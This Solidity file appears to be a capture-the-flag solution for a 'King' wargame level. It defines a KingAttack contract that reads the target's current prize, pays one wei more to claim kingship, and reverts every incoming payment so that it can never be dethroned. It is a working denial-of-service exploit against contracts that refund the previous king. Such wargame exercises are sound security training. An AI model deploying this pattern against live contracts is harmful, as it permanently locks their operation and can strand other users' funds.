// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "forge-std/console.sol";
import "./King.sol";

contract KingAttack {
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() external {
        (bool success, bytes memory data) = target.call(abi.encodeWithSignature("prize()"));
        require(success, "call failed");

        uint256 currPrize = abi.decode(data, (uint256));

        (bool success2, ) = address(target).call{value: currPrize + 1}("");
        require(success2, "call failed 2");
    }

    receive() external payable {
        revert("I'm the only King");
    }
}
